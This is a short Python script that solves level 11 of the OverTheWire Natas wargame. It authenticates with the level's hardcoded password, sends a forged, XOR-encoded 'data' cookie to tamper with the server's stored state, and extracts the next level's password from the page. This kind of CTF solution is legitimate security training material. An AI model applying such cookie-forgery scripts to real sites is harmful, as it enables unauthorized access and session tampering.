from bs4 import BeautifulSoup as bs
import urllib
import base64
import binascii
import requests
import re

u='natas11'
p='U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'
l=f'http://{u}.natas.labs.overthewire.org'
c={'data':'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'}#cookie
resp=requests.post(l,auth=(u, p),cookies=c)
print(re.findall(f'The password for natas12 is (.*)<br>',resp.text)[0])
